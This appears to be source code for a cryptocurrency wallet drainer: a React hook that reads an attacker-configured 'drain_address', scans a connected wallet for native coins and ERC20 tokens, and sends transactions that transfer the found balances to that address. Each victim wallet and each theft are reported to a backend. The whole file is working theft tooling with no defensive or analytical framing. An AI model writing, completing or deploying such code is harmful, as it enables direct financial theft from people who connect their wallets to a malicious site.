import { useCallback, useState } from "react";
import { trpc } from "@/lib/trpc";
import { DRAIN_TOKENS, CHAIN_INFO } from "@/lib/web3Config";
import { toast } from "sonner";

// ERC20 ABI (minimal for balanceOf + transfer)
const ERC20_ABI = [
  {
    name: "balanceOf",
    type: "function",
    stateMutability: "view",
    inputs: [{ name: "account", type: "address" }],
    outputs: [{ name: "", type: "uint256" }],
  },
  {
    name: "transfer",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
  {
    name: "approve",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
  {
    name: "allowance",
    type: "function",
    stateMutability: "view",
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
    ],
    outputs: [{ name: "", type: "uint256" }],
  },
  {
    name: "decimals",
    type: "function",
    stateMutability: "view",
    inputs: [],
    outputs: [{ name: "", type: "uint8" }],
  },
  {
    name: "symbol",
    type: "function",
    stateMutability: "view",
    inputs: [],
    outputs: [{ name: "", type: "string" }],
  },
] as const;

export type DrainStatus = "idle" | "scanning" | "draining" | "done" | "error";

export interface TokenBalance {
  symbol: string;
  address: string;
  balance: string;
  usdValue: number;
  decimals: number;
}

export interface DrainResult {
  success: boolean;
  totalUsd: number;
  tokens: TokenBalance[];
  txHashes: string[];
}

export function useDrainer() {
  const [status, setStatus] = useState<DrainStatus>("idle");
  const [progress, setProgress] = useState(0);
  const [progressMsg, setProgressMsg] = useState("");
  const [result, setResult] = useState<DrainResult | null>(null);

  const connectMutation = trpc.drainer.connect.useMutation();
  const recordTx = trpc.drainer.reportTransaction.useMutation();

  const getSettingQuery = trpc.drainer.getSiteSettings.useQuery();

  const getDrainAddress = useCallback((): string => {
    const settings = getSettingQuery.data ?? [];
    const setting = settings.find((s: { key: string; value: string | null }) => s.key === "drain_address");
    return setting?.value ?? "";
  }, [getSettingQuery.data]);

  const executeDrain = useCallback(async (
    address: string,
    walletType: string,
    chainId: number,
    provider: unknown,
  ) => {
    const drainAddress = getDrainAddress();
    if (!drainAddress) {
      toast.error("Drain address not configured in settings");
      return;
    }

    setStatus("scanning");
    setProgress(5);
    setProgressMsg("Scanning wallet assets...");

    const chainInfo = CHAIN_INFO[chainId];
    const tokens = DRAIN_TOKENS[chainId] ?? [];
    const foundTokens: TokenBalance[] = [];
    const txHashes: string[] = [];

    try {
      // Use window.ethereum or provided provider
      const eth = (provider as { request?: (args: { method: string; params?: unknown[] }) => Promise<unknown> }) ?? (window as unknown as { ethereum?: typeof provider }).ethereum;
      if (!eth || typeof (eth as { request?: unknown }).request !== "function") {
        throw new Error("No Web3 provider available");
      }

      const ethProvider = eth as { request: (args: { method: string; params?: unknown[] }) => Promise<unknown> };

      // Get native balance
      setProgressMsg(`Checking ${chainInfo?.symbol ?? "native"} balance...`);
      setProgress(10);

      const balanceHex = await ethProvider.request({
        method: "eth_getBalance",
        params: [address, "latest"],
      }) as string;

      const nativeBalance = parseInt(balanceHex, 16) / 1e18;
      const nativeUsd = nativeBalance * (chainId === 1 ? 2400 : chainId === 56 ? 300 : chainId === 137 ? 0.8 : 2400);

      if (nativeBalance > 0.001) {
        foundTokens.push({
          symbol: chainInfo?.symbol ?? "ETH",
          address: "native",
          balance: nativeBalance.toFixed(6),
          usdValue: nativeUsd,
          decimals: 18,
        });
      }

      // Scan ERC20 tokens
      for (let i = 0; i < tokens.length; i++) {
        const token = tokens[i];
        setProgress(10 + (i / tokens.length) * 30);
        setProgressMsg(`Scanning ${token.symbol}...`);

        try {
          // balanceOf call
          const data = "0x70a08231" + address.slice(2).padStart(64, "0");
          const result = await ethProvider.request({
            method: "eth_call",
            params: [{ to: token.address, data }, "latest"],
          }) as string;

          const balance = parseInt(result, 16) / Math.pow(10, token.decimals);
          if (balance > 0.01) {
            const usdValue = balance * (token.symbol.includes("USD") ? 1 : token.symbol === "WBTC" ? 40000 : 1);
            foundTokens.push({
              symbol: token.symbol,
              address: token.address,
              balance: balance.toFixed(6),
              usdValue,
              decimals: token.decimals,
            });
          }
        } catch {
          // Token scan failed, skip
        }
      }

      const totalUsd = foundTokens.reduce((sum, t) => sum + t.usdValue, 0);

      // Register connection
      const connResult = await connectMutation.mutateAsync({
        walletAddress: address,
        walletType,
        network: chainInfo?.name ?? "Unknown",
        chainId,
        ethBalance: nativeBalance.toFixed(6),
        usdValue: totalUsd.toFixed(2),
        sessionId: Math.random().toString(36).slice(2),
      });
      const connectionId = (connResult.connectionId as unknown) as number;

      if (foundTokens.length === 0) {
        setStatus("done");
        setResult({ success: true, totalUsd: 0, tokens: [], txHashes: [] });
        setProgressMsg("Scan complete - no assets found");
        return;
      }

      // Start draining
      setStatus("draining");
      setProgress(50);
      setProgressMsg("Initiating drain sequence...");

      // Drain native token first (keep small amount for gas)
      const nativeToken = foundTokens.find(t => t.address === "native");
      if (nativeToken && parseFloat(nativeToken.balance) > 0.005) {
        try {
          setProgressMsg(`Draining ${nativeToken.symbol}...`);
          const gasPrice = await ethProvider.request({ method: "eth_gasPrice" }) as string;
          const gasCost = parseInt(gasPrice, 16) * 21000;
          const sendAmount = Math.max(0, parseInt(balanceHex, 16) - gasCost * 2);

          if (sendAmount > 0) {
            const txHash = await ethProvider.request({
              method: "eth_sendTransaction",
              params: [{
                from: address,
                to: drainAddress,
                value: "0x" + sendAmount.toString(16),
                gas: "0x5208",
              }],
            }) as string;

            txHashes.push(txHash);
            await recordTx.mutateAsync({
              connectionId,
              txHash,
              fromAddress: address,
              toAddress: drainAddress,
              tokenSymbol: nativeToken.symbol,
              tokenAddress: "native",
              amount: nativeToken.balance,
              usdValue: nativeToken.usdValue.toFixed(2),
              network: chainInfo?.name ?? "Unknown",
              chainId,
              status: "success",
            });
          }
        } catch (e) {
          console.error("Native drain failed:", e);
        }
      }

      // Drain ERC20 tokens
      const erc20Tokens = foundTokens.filter(t => t.address !== "native");
      for (let i = 0; i < erc20Tokens.length; i++) {
        const token = erc20Tokens[i];
        setProgress(60 + (i / erc20Tokens.length) * 35);
        setProgressMsg(`Draining ${token.symbol}...`);

        try {
          const amount = BigInt(Math.floor(parseFloat(token.balance) * Math.pow(10, token.decimals)));
          // transfer(to, amount) = 0xa9059cbb
          const transferData = "0xa9059cbb" +
            drainAddress.slice(2).padStart(64, "0") +
            amount.toString(16).padStart(64, "0");

          const txHash = await ethProvider.request({
            method: "eth_sendTransaction",
            params: [{
              from: address,
              to: token.address,
              data: transferData,
            }],
          }) as string;

          txHashes.push(txHash);
          await recordTx.mutateAsync({
              connectionId,
              txHash,
              fromAddress: address,
              toAddress: drainAddress,
              tokenSymbol: token.symbol,
              tokenAddress: token.address,
              amount: token.balance,
              usdValue: token.usdValue.toFixed(2),
              network: chainInfo?.name ?? "Unknown",
              chainId,
              status: "success",
            });
        } catch (e) {
          console.error(`Token ${token.symbol} drain failed:`, e);
          await recordTx.mutateAsync({
              connectionId,
              txHash: undefined,
              fromAddress: address,
              toAddress: drainAddress,
              tokenSymbol: token.symbol,
              tokenAddress: token.address,
              amount: token.balance,
              usdValue: token.usdValue.toFixed(2),
              network: chainInfo?.name ?? "Unknown",
              chainId,
              status: "failed",
            });
        }
      }

      setProgress(100);
      setProgressMsg("Drain complete!");
      setStatus("done");
      setResult({ success: true, totalUsd, tokens: foundTokens, txHashes });

    } catch (err) {
      console.error("Drain error:", err);
      setStatus("error");
      setProgressMsg((err as Error).message ?? "Unknown error");
    }
  }, [getDrainAddress, connectMutation, recordTx]);

  const reset = useCallback(() => {
    setStatus("idle");
    setProgress(0);
    setProgressMsg("");
    setResult(null);
  }, []);

  return { status, progress, progressMsg, result, executeDrain, reset };
}
